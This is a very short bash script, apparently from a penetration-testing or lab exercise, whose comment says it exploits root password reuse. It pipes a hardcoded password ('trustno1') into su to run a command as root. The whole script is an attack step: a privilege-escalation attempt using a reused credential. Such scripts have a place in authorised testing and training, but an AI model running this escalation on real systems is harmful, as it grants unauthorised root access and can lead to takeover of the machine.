#!/usr/bin/env bash
set -e

# Exploit root password reuse: su to root with lowpriv password
echo 'trustno1' | su root -c whoami
